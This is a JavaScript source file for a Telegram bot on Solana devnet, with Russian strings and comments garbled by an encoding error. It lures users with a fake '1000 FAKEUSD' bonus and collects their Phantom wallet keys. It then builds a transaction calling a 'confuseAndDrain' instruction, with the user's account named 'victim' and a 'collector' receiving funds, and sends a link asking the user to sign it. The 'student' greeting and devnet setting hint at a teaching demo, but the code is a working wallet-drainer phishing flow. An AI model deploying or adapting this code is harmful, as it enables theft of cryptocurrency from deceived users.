import TelegramBot from 'node-telegram-bot-api';
import dotenv from 'dotenv';
import { Connection, PublicKey, Transaction } from '@solana/web3.js';
import { Program, AnchorProvider } from '@coral-xyz/anchor';
import idl from './idl.json' assert { type: 'json' };

dotenv.config();

const bot = new TelegramBot(process.env.BOT_TOKEN, { polling: true });
const connection = new Connection("https://api.devnet.solana.com", "confirmed");

const PROGRAM_ID = new PublicKey("3zajB2DfuaDc9omwZPhroHzFBZD8RP14DsLBajeWLNmQ");
const FAKE_ACCOUNT = new PublicKey("2RjvZTfQT5v7pDF19KhtTh3xCnMWcvM6W9Upgpi2ZzQP");
const SYSTEM_PROGRAM = new PublicKey("11111111111111111111111111111111");

// –•—Ä–∞–Ω–∏–ª–∏—â–µ –¥–ª—è —Å–≤—è–∑–∏ chatId <-> publicKey
const userWallets = new Map();

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const fullName = `${msg.from.first_name || ''} ${msg.from.last_name || ''}`.trim();

  const webAppURL = `${process.env.WEBAPP_URL}?userId=${userId}`;

  bot.sendMessage(chatId, `–ü—Ä–∏–≤–µ—Ç, ${fullName || '—Å—Ç—É–¥–µ–Ω—Ç'}! –£—á–∞—Å—Ç–≤—É–π –≤ –±–æ–Ω—É—Å–Ω–æ–π –∞–∫—Ü–∏–∏:`, {
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "üí∏ –ü–æ–ª—É—á–∏—Ç—å 1000 FAKEUSD",
            web_app: { url: webAppURL }
          }
        ]
      ]
    }
  });
});

// –û–±—Ä–∞–±–æ—Ç–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∏–∑ Telegram WebApp (–ø–æ–ª—É—á–µ–Ω–∏–µ publicKey)
bot.on('web_app_data', (msg) => {
  try {
    const data = JSON.parse(msg.web_app_data.data);
    if (data.type === 'wallet_connected' && data.publicKey) {
      const chatId = msg.chat.id;
      userWallets.set(chatId, data.publicKey);

      bot.sendMessage(chatId, `–ö–æ—à–µ–ª–µ–∫ Phantom –ø–æ–¥–∫–ª—é—á—ë–Ω: ${data.publicKey}`);
    }
  } catch (err) {
    console.error('–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–∞–∑–±–æ—Ä–µ web_app_data:', err);
  }
});

// –ö–æ–º–∞–Ω–¥–∞ –¥–ª—è —Å–æ–∑–¥–∞–Ω–∏—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –∏ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å—Å—ã–ª–∫–∏ –Ω–∞ –ø–æ–¥–ø–∏—Å—å
bot.onText(/\/claim/, async (msg) => {
  const chatId = msg.chat.id;
  const userPublicKeyStr = userWallets.get(chatId);

  if (!userPublicKeyStr) {
    bot.sendMessage(chatId, "–°–Ω–∞—á–∞–ª–∞ –ø–æ–¥–∫–ª—é—á–∏ Phantom Wallet —á–µ—Ä–µ–∑ –∫–Ω–æ–ø–∫—É –±–æ–Ω—É—Å–Ω–æ–π –∞–∫—Ü–∏–∏.");
    return;
  }

  try {
    const userPublicKey = new PublicKey(userPublicKeyStr);
    const provider = new AnchorProvider(connection, {
      publicKey: userPublicKey,
      signTransaction: async (tx) => tx // –Ω–µ –ø–æ–¥–ø–∏—Å—ã–≤–∞–µ–º –∑–¥–µ—Å—å, –ø–æ–¥–ø–∏—à–µ—Ç –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –≤ Phantom
    }, { preflightCommitment: "confirmed" });

    const program = new Program(idl, PROGRAM_ID, provider);

    const ix = await program.methods
      .confuseAndDrain()
      .accounts({
        victim: userPublicKey,
        collector: PROGRAM_ID,
        fakeAccount: FAKE_ACCOUNT,
        systemProgram: SYSTEM_PROGRAM
      })
      .instruction();

    const tx = new Transaction().add(ix);
    tx.feePayer = userPublicKey;
    tx.recentBlockhash = (await connection.getLatestBlockhash()).blockhash;

    const serializedTx = tx.serialize({
      requireAllSignatures: false,
      verifySignatures: false
    });
    const base64Tx = serializedTx.toString('base64');

    const phantomUrl = `https://phantom.app/ul/v1/signTransaction?d=${encodeURIComponent(base64Tx)}&cluster=devnet`;

    bot.sendMessage(chatId, "–ü–æ–¥–ø–∏—à–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é –≤ Phantom Wallet:", {
      reply_markup: {
        inline_keyboard: [
          [{ text: "‚úçÔ∏è –ü–æ–¥–ø–∏—Å–∞—Ç—å —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é", url: phantomUrl }]
        ]
      }
    });
  } catch (error) {
    console.error("–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ñ–æ—Ä–º–∏—Ä–æ–≤–∞–Ω–∏–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏:", error);
    bot.sendMessage(chatId, "–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏.");
  }
});
